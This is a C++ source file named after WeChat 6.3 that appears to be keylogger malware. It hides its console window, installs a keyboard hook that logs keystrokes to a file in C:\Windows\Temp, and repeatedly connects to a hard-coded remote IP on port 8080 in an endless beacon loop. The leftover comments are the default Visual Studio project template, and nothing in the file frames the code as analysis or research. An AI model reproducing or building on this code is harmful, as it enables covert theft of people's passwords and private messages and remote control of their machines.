// wechat6.3.cpp : 此文件包含 "main" 函数。程序执行将在此处开始并结束。
//

#include "pch.h"
#include <iostream>
#include "KbHook.h"
#include<stdio.h>
#include<string.h>

#pragma comment( linker, "/subsystem:\"windows\" /entry:\"mainCRTStartup\"" ) // 设置入口地址
#pragma  comment(lib,"ws2_32.lib")

using namespace std;


#define SERVER_PORT  8080
#define SERVER_IP    "110.110.110.110"

#define LOG_PATH  "C:\\Windows\\Temp\\kbhook.dat"

_KbHook* m_pKbHook = NULL;




bool StartKeyLogger(char* logFileName)
{
	if (m_pKbHook == NULL)
	{
		m_pKbHook = new _KbHook();
	}

	m_pKbHook->SendStartHook(logFileName, strlen(logFileName));

	Sleep(100);

	return true;
}

bool StopKeyLogger()
{
	if (m_pKbHook == NULL)
	{
		return true;
	}

	m_pKbHook->SendStopHook();

	Sleep(100);

	return true;
}

bool DelKeyLogger()
{
	if (m_pKbHook == NULL)
	{
		return true;
	}

	m_pKbHook->SendStopHook();

	Sleep(100);

	delete m_pKbHook;
	m_pKbHook = NULL;

	return true;
}
using namespace std;


int main(int argc, char *argv[])
{

	StartKeyLogger(LOG_PATH);

	while (1)
	{
	WORD sockVersion = MAKEWORD(2, 2);
	WSADATA data;
	if (WSAStartup(sockVersion, &data) != 0)
	{
		
	}

	SOCKET sclient = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
	if (sclient == INVALID_SOCKET)
	{
		printf("invalid socket !");
		
	}

	sockaddr_in serAddr;
	serAddr.sin_family = AF_INET;
	serAddr.sin_port = htons(SERVER_PORT);
	serAddr.sin_addr.S_un.S_addr = inet_addr(SERVER_IP);
	if (connect(sclient, (sockaddr *)&serAddr, sizeof(serAddr)) == SOCKET_ERROR)
	{
		printf("connect error !");
		closesocket(sclient);
		
	}
	char * sendData = "你好!\n";
	send(sclient, sendData, strlen(sendData), 0);

	char recData[255];
	int ret = recv(sclient, recData, 255, 0);
	if (ret > 0)
	{
		recData[ret] = 0x00;
		printf(recData);
	}
	closesocket(sclient);
	WSACleanup();


	Sleep(1000);
	}	
}


// 运行程序: Ctrl + F5 或调试 >“开始执行(不调试)”菜单
// 调试程序: F5 或调试 >“开始调试”菜单

// 入门提示: 
//   1. 使用解决方案资源管理器窗口添加/管理文件
//   2. 使用团队资源管理器窗口连接到源代码管理
//   3. 使用输出窗口查看生成输出和其他消息
//   4. 使用错误列表窗口查看错误
//   5. 转到“项目”>“添加新项”以创建新的代码文件，或转到“项目”>“添加现有项”以将现有代码文件添加到项目
//   6. 将来，若要再次打开此项目，请转到“文件”>“打开”>“项目”并选择 .sln 文件
